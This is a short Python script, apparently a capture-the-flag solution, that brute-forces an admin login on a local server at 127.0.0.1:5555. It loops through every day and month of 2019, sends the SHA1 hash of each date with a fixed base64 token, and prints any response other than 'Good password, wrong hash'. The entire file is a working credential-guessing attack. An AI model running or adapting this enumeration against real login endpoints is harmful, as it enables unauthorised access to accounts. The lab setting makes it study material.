import requests
import hashlib

date = ""
for i in range(1, 32):
    for j in range(1, 13):
        date = ""
        if i < 10:
            date += "0"
        date += str(i) + "/"
        if j < 10:
            date += "0"
        date += str(j) + "/2019"
        hashed = hashlib.sha1(date.encode()).hexdigest()
        r = requests.post("http://127.0.0.1:5555", None, {"action": "login", "username": "admin", "token": "Y3liZXI=", "hash":hashed})
        if r.text != "Good password, wrong hash":
            print(f"date and hash found:\nDate:{date}\nHash:{hashed}\nMessage:{r.text}")